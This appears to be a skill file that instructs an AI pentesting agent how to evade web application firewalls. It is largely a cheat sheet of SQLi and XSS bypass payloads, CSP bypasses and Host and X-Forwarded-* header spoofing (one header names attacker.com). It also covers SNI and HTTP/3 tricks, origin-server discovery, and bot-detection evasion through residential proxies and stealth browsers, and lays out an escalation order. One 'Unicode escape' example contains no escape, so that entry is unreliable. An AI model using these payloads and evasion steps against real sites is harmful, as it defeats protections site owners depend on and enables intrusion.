---
name: hunt-waf-bypass
description: "WAF bypass techniques for web application testing. Covers 20 bypass categories: encoding bypass (URL/HTML/Unicode/double encoding), case variation, comment injection, HTTP header manipulation, chunked encoding, IP rotation, origin server discovery, TLS fingerprint evasion (JA3/JA4), CAPTCHA bypass (Cloudflare Turnstile), SQLi-specific bypasses (JSON injection CVE-2023-50969, tamper scripts), XSS-specific bypasses (mXSS, polyglot, CSP bypass), HTTP protocol bypasses (method obfuscation, HPP, Host header spoofing), HTTP/2 and HTTP/3 protocol bypasses, SNI manipulation, domain fronting, ML-based WAF evasion, GraphQL WAF bypasses. Includes WAF fingerprinting (WAFW00F, IdentYwaf), popular WAF detection (Cloudflare, Akamai, Imperva, AWS WAF, ModSecurity), and bypass chaining methodology. Use when WAF is blocking payloads during web app tests, when testing behind Cloudflare/Akamai/AWS WAF, or when standard payloads are being filtered."
---

# WAF Bypass Techniques

## When to Use
- WAF is blocking your payloads (403, challenge pages, dropped connections)
- Testing behind Cloudflare, Akamai, Imperva, AWS WAF, ModSecurity
- Standard XSS/SQLi/SSRF payloads are being filtered
- Need to find the origin server IP to bypass CDN/WAF entirely

## When NOT to Use
- Target has no WAF (payloads work directly)
- You haven't confirmed the WAF vendor yet (fingerprint first)

---

## WAF Detection & Fingerprinting

### Popular WAFs
- **Cloudflare** — `__cf_bm`, `cf_clearance` cookies, `/cdn-cgi/` routes
- **Akamai** — `AkamaiGHost` server header
- **Imperva/Incapsula** — `X-CDN: Incapsula` headers
- **AWS WAF** — `AWSALB` or `AWSALBCORS` cookies
- **ModSecurity** — specific error messages and block pages
- **Sucuri** — `X-Sucuri-ID` headers
- **Fastly** — `fastly-debug-*` headers

### Fingerprinting Tools
- **WAFW00F** — largest fingerprint database
- **IdentYwaf** — blind WAF detection
- **Ja3er/ja4plus** — TLS fingerprint analysis

---

## Bypass Techniques

### 1. Call the Origin Server Directly
Skip the WAF entirely by finding the real server IP:
- Shodan / CloudFlair for origin IP discovery
- Historical DNS records (SecurityTrails API)
- Check `Alt-Svc` header leakage for HTTP/3
- Stale A records (~40% of Fortune-100 origins exposed)

```bash
# Forge request directly to origin
curl -H "Host: target.com" https://<origin-ip>/
```

### 2. SQLi WAF Bypasses

| Technique | Example |
|---|---|
| Case variation | `SeLeCt`, `UnIoN` |
| Comment injection | `UN/**/ION SE/**/LECT` |
| URL encoding | `%55%4E%49%4F%4E` |
| Hex encoding | `0x53454C454354` |
| Double encoding | `%252f` |
| Whitespace manipulation | `UNION/**/SELECT`, tabs, newlines |
| String concatenation | MySQL: `CONCAT('a','b')`, Oracle: `'a'\|\|'b'` |
| Null byte | `%00' UNION SELECT...` |
| JSON injection (CVE-2023-50969) | `{"id": {"$gt": "' OR 1=1--"}}` |

### 3. XSS WAF Bypasses

```html
<!-- mXSS (mutation-based) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Alternative tags -->
<svg onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- JS obfuscation -->
<img src=x onerror="window['al'+'ert'](1)">
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- Unicode escape -->
<script>alert(1)</script>

<!-- Polyglot (works in multiple contexts) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
```

### 4. CSP Bypass Techniques
- JSONP endpoint abuse: `<script src="https://allowed-domain.com/jsonp?callback=alert(1)">`
- DOM clobbering: `<form id=self><input name=location>`
- Trusted Types gaps on allowed origins

### 5. HTTP Protocol Bypasses

```bash
# Method obfuscation
gEt /admin HTTP/1.1

# HTTP Parameter Pollution
?id=safe&id=malicious

# Header manipulation — spoof internal origin
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: attacker.com
X-Real-IP: 127.0.0.1

# Host header spoofing
curl -H "Host: legit.example.net" https://evil.example.com
```

### 6. TLS/Protocol Evasion

```bash
# HTTP/2 :authority bypass
curl --http2 -H "Host: legit-domain.com" https://actual-target.com/

# HTTP/3 (QUIC) — many WAFs don't inspect UDP
curl --http3 https://target.com

# SNI manipulation
openssl s_client -connect <target-ip>:443 -servername allowed.example.com

# Omit SNI entirely
curl --insecure -H "Host: target.com" https://<target-ip>/
```

### 7. ML-Based WAF Evasion

```bash
# Adversarial token injection — add noise
<script>/*benign benign benign*/alert(1)</script>

# Feature engineering bypass — payload in low-weight fields
Content-Disposition: form-data; name="file"; filename="<script>alert(1)</script>"

# Embedding space manipulation — Cyrillic lookalikes
<ѕcript>alert(1)</ѕcript>
```

### 8. Residential IPs & Browser Fortification
- Data center IPs easily detected — use residential/mobile proxies
- `undetected_chromedriver` for Selenium
- `puppeteer-extra-plugin-stealth` for Puppeteer
- Match JA3/JA4 fingerprints to real browsers

---

## Bypass Chaining (Recommended Order)

1. Fingerprint the WAF vendor
2. Try origin server discovery (skip WAF entirely)
3. Apply encoding/case/comment bypasses for your payload type
4. If blocked: try HTTP protocol tricks (HPP, method, headers)
5. If still blocked: TLS/protocol evasion (HTTP/2, HTTP/3, SNI)
6. If ML-based: adversarial payloads, feature targeting
7. Last resort: residential IPs + stealth browser automation

---

## Tools

| Tool | Purpose |
|---|---|
| WAFW00F | WAF fingerprinting |
| CloudFlair | Origin IP discovery |
| SQLMap tamper scripts | SQLi WAF bypass |
| Param Miner (Burp) | Unkeyed header discovery |
| GoTestWAF | WAF rule testing |
| WAFNinja | Payload fuzzing |
| bypass-firewalls-by-DNS-history | Origin via old DNS |
| noble-tls / uTLS | TLS fingerprint spoofing |

---

## Related Skills
- **`hunt-xss`** — XSS payloads that need WAF bypass
- **`hunt-sqli`** — SQLi payloads that need WAF bypass
- **`hunt-ssrf`** — SSRF IP bypasses (different from WAF bypass)
- **`hunt-http-smuggling`** — Protocol-level attacks that can bypass WAF
- **`hunt-parameter-pollution`** — HPP as a WAF bypass vector
